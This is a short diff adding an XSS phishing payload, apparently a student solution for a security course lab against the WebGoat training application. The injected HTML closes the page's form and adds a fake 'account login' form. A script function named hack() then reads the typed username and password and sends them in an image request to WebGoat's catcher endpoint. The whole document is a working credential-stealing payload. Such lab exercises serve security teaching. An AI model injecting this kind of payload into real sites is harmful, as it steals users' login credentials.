@@ -1,0 +1,17 @@
+</form>
+<form id="ece568" method="post" name="phish"><br><br>
+    This feature requires account login:
+    <br><br>Enter Username:<br>
+    <input type="text" id="ece568_2022s_user" value="guest">
+    <br>Enter Password:<br>
+    <input type="password" id="ece568_2022s_pw" value="guest"/>
+    <input type="submit" id="ece568_2022s_submit" value="login" onclick="hack()">
+</form>
+
+<script type="text/javascript">
+    function hack() {
+        var XssImage = new Image();
+        var user = document.forms[1].ece568_2022s_user.value;
+        var pass = document.forms[1].ece568_2022s_pw.value;
+        XssImage.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishingUsername=" + user + "&phishingPassword=" + pass;
+    }</script>
